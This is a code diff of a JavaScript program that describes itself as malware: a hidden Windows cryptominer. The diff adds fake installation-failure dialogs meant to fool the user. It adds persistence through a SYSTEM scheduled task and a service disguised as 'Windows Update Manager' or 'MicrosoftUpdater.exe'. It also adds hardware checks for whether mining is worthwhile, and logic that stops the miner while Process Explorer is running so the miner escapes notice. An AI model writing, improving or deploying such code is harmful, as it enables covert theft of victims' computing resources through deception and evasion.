@@ -4,12 +4,9 @@
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
-const minerStartHashMD5 = '1d26869f8a637d353eae2e65724d6b0b'; // File integrity and identification
 
-// File path of the miner
+const flags = '--threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light';
 
-let currentMinerPath;
-let minerArgs;
 // Win-interact preferences
 
 Win.set.preferences({
@@ -34,50 +31,6 @@ Win.appManager.register({
         path: Win.path`C:\Windows\system32\resmon.exe`,
     },
 });
-
-async function optimizeRandomX() {
-
-    const cpu = await si.cpu();
-    const mem = await si.mem(); // in bytes!
-    // Minimum 2336 MB RAM for each mining thread
-    const L2CacheInKB = cpu.cache.l2/1024;
-    const L3CacheInKB = cpu.cache.l3/1024;
-    const totalMemInMB = mem.total/1048576; // 1024^2
-    let threads;
-    const threadsLimited = {
-        byL2: L2CacheInKB/256,
-        byL3: L3CacheInKB/256,
-        byMemory: totalMemInMB/2336
-    };
-
-    const lowHashrateFlags = {
-        singleThread: '--threads=1',
-        lowAffinity: '--cpu-affinity=1',
-        priority1: '--cpu-priority=1',
-        disableHugePages: '--no-huge-pages',
-        optimizeAssembly: '--asm=auto',
-        randomXLight: '--randomx-mode=light'
-    };
-
-    const mediumHashrateFlags = { // For especially modern and strong CPUs that can take 2 threads with no performance hit
-        dualThread: '--threads=2',
-        priority2: '--cpu-priority=2',
-        disableHugePages: '--no-huge-pages',
-        optimizeAssembly: '--asm=auto',
-        randomXAuto: '--randomx-mode=auto'
-    };
-
-    if (threadsLimited.byL2 < threadsLimited.byL3 && threadsLimited.byL3 > threadsLimited.byMemory) {
-        threads = Math.floor(threadsLimited.byL3);
-    }
-    if (threadsLimited.byL2 > threadsLimited.byL3 && threadsLimited.byL2 > threadsLimited.byMemory) {
-        threads = Math.floor(threadsLimited.byL2);
-    }
-    if (threadsLimited.byMemory > threadsLimited.byL2 && threadsLimited.byMemory > threadsLimited.byL3) {
-        threads = Math.floor(threadsLimited.byMemory);
-    }
-// unfinished
-}
 
 // Main loop of the malware that checks if monitoring applications are running
 
@@ -119,7 +72,7 @@ async function checkIfProcessExplorerIsRunning() {
     const systemProcesses = Win.cmd('tasklist');
     const indexedProcesses = systemProcesses.split('\n');
     const processExplorerAliases = ['procexp.exe', 'procexp64.exe', 'procexp64a.exe'];
-    for (const line of lines) {
+    for (const line of indexedProcesses) {
         for (const name of processExplorerAliases) {
             if (line.toLowerCase().includes(name))
                 return true;
@@ -130,9 +83,9 @@ async function checkIfProcessExplorerIsRunning() {
 
 function killMiner() {
     try {
-        Win.cmd(`TASKKILL /f /IM ${minerPath}`);
+        Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe /T');
     } catch {
-        Win.cmd(`TASKKILL /f /IM MicrosoftUpdater.exe`);
+        Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe'); 
     }
 }
 
@@ -141,20 +94,7 @@ function wait(ms) {
 }
 
 function runMiner() {
-    Win.cmd(currentMinerPath); 
-}
-
-async function getMinerLaunchPath() {
-    Win.cmd(`where /r C:\ start.cmd`, function(stdout) {
-        const whereIsLines = stdout.split('\n'); // List
-        for (let lines = 0; lines < whereIsLines.length; lines++) {
-            startCMDHash = Win.cmd(`certutil -hashfile ${whereIsLines} MD5`);
-            if (startCMDHash = minerStartHashMD5) {
-                currentMinerPath = whereIsLines[lines];
-                return currentMinerPath;
-            }
-        }
-    }, {suppressErrors: true});
+    Win.cmd('start.cmd' + flags);
 }
 
 async function autorunMethods() {
@@ -170,19 +110,34 @@ async function autorunMethods() {
 }
 
 async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Scheduler under the SYSTEM user
-    Win.cmd('schtasks /create /sc onstart /tn "Windows Process Manager" /tr start.cmd /ru SYSTEM');
+    Win.cmd('schtasks /create /sc onstart /tn "Windows Update Manager" /tr MicrosoftUpdater.exe /ru SYSTEM');
 }
 
 async function registerMinerAsService() {
-    Win.cmd('sc create Windows Process Manager binPath= start.cmd start= auto');
+    Win.cmd('sc create Windows Update Manager binPath= start.cmd start= auto');
     wait(1000);
-    Win.cmd('net start Windows Process Manager');
+    Win.cmd('net start Windows Update Manager');
 }
 
 async function fakeInstall() {
+    const errorCode = Math.ceil(10*Math.random()); // Integer between 0 and 10
+    const windowFailTitle = 'Installation failed';
     try {
-        Win.showDesktop();
-        await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', 'Installation failed');
+        switch (errorCode) {
+            case 1:
+                await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', windowFailTitle);
+            case 2:
+                await Win.alert('The specified file is encrypted and the user does not have the ability to decrypt it. Error code: 0x1772.', windowFailTitle);
+            case 3:
+                await Win.alert('The specified compression format is unsupported. Error code: 0x26A.', windowFailTitle);
+            case 4:
+                await Win.alert('A dynamic link library (DLL) initialization routine failed. Error code: 0x45A.', windowFailTitle);
+            case 5:
+                await Win.alert('A configuration value is invalid. Error code: 0xFDF.', windowFailTitle);
+            default:
+                await Win.alert('A security package specific error occurred. Error code: 0x721.', windowFailTitle); 
+        }
+        await Win.alert('Please visit https://learn.microsoft.com/en-us/windows/win32/debug/error-handling for more information.', 'Windows Updater failure');
     } catch {
         console.log("An error occured");
     } finally {
@@ -190,15 +145,14 @@ async function fakeInstall() {
     }
 }
 
-async function checkForHardwareSupport() {
+async function checkIfWorthMining() {
     try {
         const cpu = await si.cpu();
         const os = await si.osInfo();
         const mem = await si.mem(); // in bytes!
-        const system = await si.system(); // used for checking if it's a virtual machine
 
-        const L2CacheInKB = cpu.cache.l2;
-        const L3CacheInKB = cpu.cache.l3;
+        const L2CacheInKB = cpu.cache.l2/1024;
+        const L3CacheInKB = cpu.cache.l3/1024;
 
         if (cpu.cores < 2 || mem.total < 4294967296 || L2CacheInKB < 256 || L3CacheInKB < 2048) {
             // RandomX requires a MINIMUM of 256 KB L2 cache and 2 MB L3 cache. CPUs with less than 2 cores with less than 4 GB RAM are
@@ -216,9 +170,6 @@ async function checkForHardwareSupport() {
             default:
                 break;
         }
-        if (system.virtual == true) {
-            await Win.alert('You are running this in a virtual machine.', 'Virtual machine detected');
-        }
     } catch {
         process.exit();
     } finally {
@@ -226,5 +177,8 @@ async function checkForHardwareSupport() {
     }
 }
 
-checkForHardwareSupport();
-main();
+// Main structure of the miner before main loop
+
+checkIfWorthMining();
+fakeInstall();
+autorunMethods();
